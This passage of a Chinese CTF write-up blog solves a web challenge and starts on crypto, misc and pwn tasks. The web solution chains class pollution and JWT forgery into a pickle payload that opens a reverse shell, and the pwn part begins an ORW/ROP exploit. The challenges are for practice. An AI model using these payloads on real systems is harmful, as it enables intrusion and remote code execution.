class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> json, file <span class="keyword">as</span> file_, text, redirect</span><br><span class="line"><span class="keyword">from</span> sanic_cors <span class="keyword">import</span> CORS</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> secret_key</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">app = Sanic(<span class="string">&quot;App&quot;</span>)</span><br><span class="line">pickle_file = <span class="string">&quot;data.pkl&quot;</span></span><br><span class="line">my_object = &#123;&#125;</span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">safe_modules = &#123;</span><br><span class="line">    <span class="string">&#x27;math&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;datetime&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;collections&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">safe_names = &#123;</span><br><span class="line">    <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;timedelta&#x27;</span>, <span class="string">&#x27;timezone&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loads&#x27;</span>, <span class="string">&#x27;dumps&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;namedtuple&#x27;</span>, <span class="string">&#x27;deque&#x27;</span>, <span class="string">&#x27;Counter&#x27;</span>, <span class="string">&#x27;defaultdict&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> safe_modules <span class="keyword">and</span> name <span class="keyword">in</span> safe_names:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CORS(app, supports_credentials=<span class="literal">True</span>, origins=[<span class="string">&quot;http://localhost:8000&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">request, *args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = jwt.decode(token, <span class="built_in">str</span>(secret_key), algorithms=[<span class="string">&#x27;HS256&#x27;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Token expired&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid token&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&quot;role&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Permission Denied&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> func(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_reader</span>(<span class="params">request</span>):</span><br><span class="line">    file = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> text(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/upload.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;No file provided&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    file_object = file[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">isinstance</span>(file, <span class="built_in">list</span>) <span class="keyword">else</span> file</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        new_data = restricted_loads(file_object.body)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            my_object.update(new_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object loaded but not updated&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pickle_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(my_object, f)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object updated&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> pickle.UnpicklingError:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;Dangerous pickle file&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/register.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        NewUser = User(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">        merge(request.json, NewUser)</span><br><span class="line">        users.append(NewUser)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Register Success!&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/login&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        username = request.json.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.json.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username or password missing&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((u <span class="keyword">for</span> u <span class="keyword">in</span> users <span class="keyword">if</span> u.username == username), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            <span class="keyword">if</span> user.password == password:</span><br><span class="line">                data = &#123;<span class="string">&quot;user&quot;</span>: username, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">                data[<span class="string">&#x27;exp&#x27;</span>] = <span class="built_in">int</span>(time.time()) + <span class="number">60</span> * <span class="number">5</span></span><br><span class="line">                token = jwt.encode(data, <span class="built_in">str</span>(secret_key), algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                response = json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/upload&quot;</span>&#125;)</span><br><span class="line">                response.cookies[<span class="string">&quot;token&quot;</span>] = token</span><br><span class="line">                response.headers[<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>] = request.headers.get(<span class="string">&#x27;origin&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid password&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;User not found&quot;</span>&#125;, status=<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>题目给了源码,</p><ul><li>存在merge,并且User类有<code>__init__</code>,一眼原型链污染,可以污染到<code>global</code>全局变量</li><li>存在<code>RestrictedUnpickler</code>并重写了<code>find_class</code>,可以绕过来<code>pickle</code>反序列化</li></ul><p>​    所以这道题思路就是先利用原型链污染来污染<code>secret_key</code>伪造<code>admin</code>，再污染<code>safe_modules</code>和<code>safe_names</code>来绕过<code>RestrictedUnpickler</code>限制即可.</p><p>源码中<code>/register</code>路由可以进行原型链污染</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093950109-474360410.png" alt="image-20241019162312868"></p><p>在<code>/upload</code>路由可以上传pkl文件来触发pickle反序列化.</p><p>所以直接先传</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;secret_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>污染<code>secret_key</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094025395-485307447.png" alt="image-20241019162519604"></p><p>之后jwt伪造</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094030306-835463532.png" alt="image-20241019162618743"></p><p>再污染</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_names&quot;</span> <span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;getattr&quot;</span><span class="punctuation">,</span><span class="string">&quot;system&quot;</span><span class="punctuation">,</span><span class="string">&quot;dict&quot;</span><span class="punctuation">,</span><span class="string">&quot;globals&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">和</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_modules&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;builtins&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>之后根据<a href="https://goodapple.top/archives/1069">博客</a>里面绕过<code>builtins</code>的例子写<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=<span class="string">&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dddd.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Type of &#x27;data&#x27;: <span class="subst">&#123;<span class="built_in">type</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Module of &#x27;data&#x27;: <span class="subst">&#123;data.__module__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(data, <span class="string">&#x27;__module__&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>上传即可</p><p>PS:这shell弹的太慢了,我还以为环境死了差点关了….</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094112459-1685459773.png" alt="image-20241019162930878"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>题目描述</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimic is a keyword.</span><br><span class="line"><span class="number">0</span>b<span class="number">050</span><span class="keyword">c</span><span class="number">0e180</span>e<span class="number">585</span>f<span class="number">5</span><span class="keyword">c</span><span class="number">52555</span><span class="keyword">c</span><span class="number">5544545</span><span class="keyword">c</span><span class="number">0</span>a<span class="number">0</span>f<span class="number">44535</span>f<span class="number">0</span>f<span class="number">5e445658595844050</span>f<span class="number">5</span>d<span class="number">0</span>f<span class="number">0</span>f<span class="number">55590</span><span class="keyword">c</span><span class="number">555e5</span>a<span class="number">0914</span></span><br></pre></td></tr></table></figure><p>直接给gpt，秒了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094135992-1445668991.png" alt="image-20241019163249407"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094156218-2020019155.png" alt="image-20241019163313547"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ezflag"><a href="#ezflag" class="headerlink" title="ezflag"></a>ezflag</h2><p>解压压缩包有个流量包,拿工具跑出来一个压缩包</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094229732-112185337.png" alt="image-20241019163729644"></p><p>解压后有个<code>flag.zip</code>，但是解压不出来，拿file看一下发现是一个png</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094425840-1389928001.png" alt="image-20241019163915023"></p><p>之后改一下后缀即可得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094352731-1655859914.png" alt="image-20241019163906271"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin revenge"></a>signin revenge</h2><h3 id="题目libc环境"><a href="#题目libc环境" class="headerlink" title="题目libc环境"></a>题目libc环境</h3><blockquote><p>那道题目的时候，发现题目是直接跑不起来的。开始以为是沙箱的问题，还是太菜了。其实更换题目libc环境的问题</p><p>这里跟换一下题目的libc环境，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed  libc.so.6 ./libc.so.6 vuln</span><br><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2  vuln</span><br></pre></td></tr></table></figure><p>ldd vuln查看一下更换是否成功。</p><p>然后就可以正常运行了。</p><p>踩坑点：注意要把给定的libc文件进行授权。并且要在管理员模式下授权。</p><p>这里注意不换也行，正常打远程应该不影响做题，但是复现跑本地就会遇到麻烦了。但是如果是你是kali的话。把他俩放在同一文件下kali会自行匹配ld文件和libc文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/<span class="number">11111</span>$ ldd vuln</span><br><span class="line">linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff6fb85000</span>)</span><br><span class="line">./libc.so<span class="number">.6</span> (<span class="number">0x00007fce115dc000</span>)    <span class="comment">//---------------------------------------------&gt;&gt;&gt;ld文件</span></span><br><span class="line">./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fce117d0000</span>)<span class="comment">//-------&gt;&gt;&gt;libc文件</span></span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/<span class="number">11111</span>$ </span><br></pre></td></tr></table></figure></blockquote><p>先日常检查一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/桌面/啊布拉布拉/11111/2222/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ </span><br></pre></td></tr></table></figure><p>正常的NX和got表可写</p><p>丢进ida里面看看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">sandbox</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;lets move and pwn!&quot;</span>);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x130</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进去可以明显的看见一个沙箱函数和我们所要纯在漏洞的read函数</p><p>简单看一下沙箱函数</p><p>这里我问了一下gpt，其实大概我的理解就是提醒我们使用ORW</p><h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>首先通过<code>open函数</code>向<code>bss段上</code>中写入<code>b&#39;./flag\x00\x00&#39;</code>，并将<code>b&#39;./flag\x00\x00&#39;</code>作为<code>open函数</code>的参数，构造<code>open(b&#39;./flag\x00\x00&#39;)</code>用来打开当前目录名为flag的文件，其中0表示只读方式打开。然后构造 <code>read(3, name_addr, 0x50)</code> 将 flag 内容写入到 <code>name</code> 的地址处，再通过构造 <code>write(1, name_addr, 0x50)</code> 将 flag 内容从 <code>name</code> 的地址处输出到终端。</p><p>寄存器的偏移查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./libc.so.6 --only  <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure><p>ROP链就是一个正常的泄露libc基址链</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 